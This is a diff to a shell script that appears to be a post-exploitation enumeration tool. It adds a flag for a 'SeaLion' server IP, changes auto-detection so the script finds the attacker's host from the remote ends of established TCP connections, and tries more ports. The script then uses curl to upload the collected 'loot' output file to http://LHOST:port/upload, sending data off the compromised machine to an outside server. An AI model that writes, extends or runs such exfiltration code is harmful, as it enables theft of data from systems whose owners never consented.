@@ -25,6 +25,7 @@ Options:
   -o [file]   Save output to file. If no name given, uses output_<N>
   -s          Silent — suppress terminal output (implies -o)
   -l          Upload output to SeaLion /upload (loot)
+  -L <ip>     SeaLion server IP (auto-detected if omitted)
   -h          Show this help
 
 Environment:
@@ -45,6 +46,11 @@ USAGE
 while [ $# -gt 0 ]; do
   case "$1" in
     -h|--help) usage ;;
+    -L)
+      shift
+      LHOST="$1"
+      shift
+      ;;
     -o)
       shift
       if [ $# -gt 0 ] && [ "${1#-}" = "$1" ] && [ -n "$1" ]; then
@@ -57,6 +63,17 @@ while [ $# -gt 0 ]; do
     -*)
       _flags=$(echo "$1" | sed 's/^-//')
       shift
+      # handle -L<ip> combined
+      case "$_flags" in
+        L*)
+          LHOST=$(echo "$_flags" | sed 's/^L//')
+          if [ -z "$LHOST" ] && [ $# -gt 0 ]; then
+            LHOST="$1"
+            shift
+          fi
+          continue
+          ;;
+      esac
       case "$_flags" in
         *o*)
           _rest=$(echo "$_flags" | sed 's/o//')
@@ -103,12 +120,12 @@ if [ "$LOOT" -eq 1 ] && [ -z "$OUTFILE" ]; then
   OUTFILE="output_$n"
 fi
 
-# ── Auto-detect LHOST ────────────────────────────────────────
+# ── Auto-detect LHOST from active connections ────────────────
 
 if [ -z "$LHOST" ]; then
   for f in /proc/net/tcp /proc/net/tcp6; do
     [ -r "$f" ] || continue
-    _candidate=$(awk '$4 == "01" {split($2,a,":"); if (a[1] != "00000000" && a[1] != "0100007F") print a[1]}' "$f" 2>/dev/null | head -1)
+    _candidate=$(awk '$4 == "01" {split($3,a,":"); if (a[1] != "00000000" && a[1] != "0100007F") print a[1]}' "$f" 2>/dev/null | head -1)
     if [ -n "$_candidate" ]; then
       _hex="$_candidate"
       _a=$(printf "%d" "0x$(echo "$_hex" | cut -c7-8)" 2>/dev/null)
@@ -563,7 +580,12 @@ if [ "$LOOT" -eq 1 ] && [ -n "$OUTFILE" ]; then
   _uploaded=0
 
   if [ -n "$LHOST" ]; then
-    for _port in 2727 8080 8000 80; do
+    if [ -n "$SLPORT" ]; then
+      _ports="$SLPORT"
+    else
+      _ports="2727 2020 8080 8000 80 8443 9090"
+    fi
+    for _port in $_ports; do
       if curl -sf -m 3 -F "file=@${OUTFILE}" "http://${LHOST}:${_port}/upload" >/dev/null 2>&1; then
         printf "\033[1;32m[+] Uploaded to loot: http://%s:%s/upload (%s)\033[0m\n" "$LHOST" "$_port" "$_lname"
         _uploaded=1
